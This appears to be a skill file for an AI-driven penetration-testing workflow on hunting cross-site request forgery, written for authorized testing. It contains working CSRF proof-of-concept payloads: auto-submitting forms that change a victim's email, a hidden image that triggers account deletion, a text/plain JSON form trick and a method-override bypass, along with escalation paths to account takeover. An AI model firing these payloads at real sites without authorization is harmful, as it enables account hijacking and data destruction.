---
name: hunt-csrf
description: >
  Hunt for Cross-Site Request Forgery on state-changing actions, and for token validation
  bypasses (missing check, token not tied to session, method/content-type bypass). Use when
  an authenticated action changes state (password change, email change, fund transfer, settings
  update, delete) via a request that could be forged from a third-party page.
  Keywords: csrf, xsrf, cross-site request forgery, same-site cookie, anti-csrf token,
  double-submit cookie, SameSite bypass, referer check bypass, state-changing GET.
  Do NOT use for read-only GET endpoints with no state change (no CSRF impact by definition —
  note as N/A, not a finding). Do NOT use for session fixation — that is a related but distinct
  hunt-auth-bypass scenario.
metadata:
  type: hunt
  phase: hunting
  cwe: [CWE-352]
  mitre_attack: [T1185]
  tools: [burp, curl]
depends_on: [active-recon, web-crawling, auth-mapping]
feeds_into: [chain-analysis, account-takeover]
chains_with: [xss, cors, open-redirect]
---

## Signals

- Forms/API calls that change state (POST/PUT/PATCH/DELETE) with no anti-CSRF token field, or a
  token present but never validated server-side.
- `Set-Cookie` for the session missing `SameSite=Strict`/`Lax`, or set to `SameSite=None` without
  a compensating token check.
- Token validation that only checks *presence* of a token, not that it matches the session
  (e.g., any syntactically valid token passes).
- State-changing actions reachable via `GET` (clickable via a plain `<img src>` — no JS needed).
- `Referer`/`Origin` used as the *only* CSRF defense (fragile — often omitted by browsers/
  proxies, or spoofable on older clients).
- JSON-only APIs assumed "safe from CSRF" — true only if the server strictly rejects
  non-`application/json` content types; test this assumption explicitly.

## Prerequisites

- An authenticated test session performing a real state-changing action, with its request fully
  captured (headers, cookies, body).
- A way to render a cross-origin PoC page (local HTML file opened in a browser, or a page hosted
  on infra you control) — CSRF proof requires a true cross-origin request, not same-origin curl.

## Methodology

1. **Identify the target action and capture its legitimate request.**
   ```bash
   # Example: capture the real password-change request via Burp/proxy, then replay pieces manually
   curl -s -b "session=VALIDTOKEN" -X POST https://target/api/account/email \
     -d "new_email=me@test.local&csrf_token=abc123"
   ```

2. **Strip the token and retest** — does removal alone break the request?
   ```bash
   curl -s -b "session=VALIDTOKEN" -X POST https://target/api/account/email \
     -d "new_email=me@test.local"
   ```
   If this still succeeds (200 + actual change), token validation is missing entirely — strong
   signal, but confirm with an actual cross-origin PoC (next step) since curl sends cookies
   regardless of origin, unlike a browser.

3. **Build and fire a cross-origin PoC.** This is the step that actually proves CSRF (a browser
   enforces SameSite/Origin; curl does not):
   ```html
   <!-- csrf_poc.html — host on a different origin than target, or open as file:// -->
   <html><body onload="document.forms[0].submit()">
     <form action="https://target/api/account/email" method="POST">
       <input type="hidden" name="new_email" value="attacker@evil.test">
     </form>
   </body></html>
   ```
   For `GET`-based state changes (worst case — no JS needed):
   ```html
   <img src="https://target/account/delete?confirm=1" style="display:none">
   ```
   For JSON-body APIs, check if the server accepts form-encoded/text-plain content that a plain
   HTML form *can* send cross-origin without a CORS preflight:
   ```html
   <form action="https://target/api/account/email" method="POST" enctype="text/plain">
     <input name='{"new_email":"attacker@evil.test","x":"' value='"}'>
   </form>
   ```
   Open the PoC in a browser **while logged into the target in the same browser**, then verify
   server-side whether the action actually executed (check the account state as the victim
   session afterward).

4. **Token-binding check** — if a token exists, confirm it's actually tied to the session, not
   just "a token exists":
   ```bash
   # Get token for session A, try it against session B's state-changing request
   curl -s -b "session=SESSION_B" -X POST https://target/api/account/email \
     -d "new_email=x@test.local&csrf_token=TOKEN_FROM_SESSION_A"
   ```
   Success = token not bound to session (just checked for well-formedness).

5. **SameSite cookie check:**
   ```bash
   curl -sI https://target/login -c cookies.txt
   grep -i "samesite" cookies.txt  # or inspect Set-Cookie header directly
   curl -sI https://target/anything | grep -i "set-cookie"
   ```
   `SameSite=None` (or absent on older stacks defaulting insecurely) without a secondary token
   defense = exploitable; `SameSite=Lax`/`Strict` generally blocks cross-site POST from a
   third-party page in modern browsers — note this as a mitigating factor, and test whether a
   `GET`-based state change still slips through Lax (top-level navigation GETs are allowed under
   Lax).

6. **Method-override / content-type bypass:**
   ```bash
   # does the app honor an override header to dodge CSRF middleware scoped to POST only?
   curl -s -b "session=VALIDTOKEN" -X GET "https://target/api/account/email?new_email=x@test.local" \
     -H "X-HTTP-Method-Override: POST"
   ```

## Tooling

- Burp Suite — "Generate CSRF PoC" feature for quick cross-origin form generation, and the CSRF
  token tracer in the Sequencer/Comparer.
- Browser devtools (manual) — required to actually validate the cross-origin behavior under real
  SameSite enforcement; curl cannot substitute for this step.
- `curl` — for the token-binding and strip tests prior to building the browser PoC.

## Root Causes

- No anti-CSRF token implemented on state-changing endpoints.
- Token implemented but validated only for presence/format, not bound to the authenticated
  session (lets an attacker harvest their *own* valid token and reuse it in a forged request if
  they can get it delivered, or simply omit it if validation is this shallow it may not even
  check).
- Reliance on `Referer`/`Origin` headers alone, which are not always sent (e.g., direct navigation,
  some HTTP clients) or are misconfigured to accept wildcard/partial matches.
- Session cookie without `SameSite` attribute (or `None` without an offsetting token check) on a
  stack old enough to default insecurely, or explicitly set for legitimate cross-site embedding
  needs without compensating controls.
- State-changing logic exposed via `GET`.

## Validation Gate (minimum proof)

- A genuinely cross-origin HTML PoC, opened in a real browser with an active victim-equivalent
  session, results in the state change actually taking effect — verified by checking the account
  state afterward (not just an HTTP 200 from the forging page, since many apps return 200 even
  on validation failure).
- Document the browser/version used (SameSite enforcement differs across browsers/versions) and
  whether the SameSite cookie attribute was present.

## Gotchas

- **Minimum proof, not account takeover.** Proving the email/password change endpoint is
  forgeable is the finding; don't chain into fully taking over an account unless that's the
  explicit next validation step with operator sign-off, especially if it locks out a real test
  account.
- **Common N/A:** read-only `GET` with no state change — not CSRF-able by definition even if
  unauthenticated; don't report "no CSRF token on GET /profile" as a finding.
- **Common N/A:** `SameSite=Lax` (the modern browser default) already blocks the classic
  auto-submitting cross-site POST PoC in current browsers — a finding here requires either
  `SameSite=None`, a GET-based state change (Lax allows top-level GET navigation), or demonstrating
  the PoC actually works in an unpatched/older browser relevant to the target's user base.
- **Overclaim trap:** a `curl` request succeeding with just the session cookie, with no actual
  cross-origin browser PoC executed, is not CSRF proof — curl doesn't enforce SameSite/Origin the
  way browsers do; always complete step 3.
- **Overclaim trap:** APIs that strictly require `Content-Type: application/json` and reject
  other content types are generally not CSRF-able via plain HTML forms (forms can't set that
  header) — verify the server actually rejects `text/plain`/`multipart/form-data` before claiming
  JSON APIs are safe, and before claiming they're exploitable.
- Double-submit-cookie pattern CSRF defenses are broken by *any* subdomain-level XSS or cookie-
  injection vulnerability — note this as a chain, not a standalone CSRF finding, if that's the
  actual path.

## Chain Anchors

Before declaring this finding complete, probe these escalation paths:

1. **Self-XSS chaining** — Can you chain with a self-XSS/reflected XSS finding to deliver the CSRF cross-user? Self-XSS alone has no cross-user impact.
2. **Account takeover path** — Can the CSRF change email or password, giving full account takeover rather than a single state change?
3. **OAuth state absence** — Is there a missing/predictable OAuth state parameter that compounds the CSRF into an account-linking attack?
4. **Admin-only actions** — Does the CSRF work against admin-only actions, raising blast radius beyond a single user?

A finding without chain anchor results is INCOMPLETE. Record each anchor as
tested/not-applicable/blocked with the reason.

## Chains & Compositions

- CSRF + no `SameSite` → **account-takeover** when chained with password/email change endpoints.
- XSS (reads anti-CSRF token from DOM) → defeats token-based CSRF defenses entirely — see
  hunt-xss; report as "CSRF defense bypassed via XSS," a distinct and more severe finding than
  bare CSRF.
- CORS misconfiguration (hunt-cors) allowing credentialed cross-origin reads can let an attacker
  *read* the CSRF token via JS, upgrading a token-protected endpoint to forgeable — check this
  interaction explicitly when both weaknesses are present.
- Login CSRF (forcing a victim into the attacker's session) → session-fixation-flavored
  **auth-bypass**.
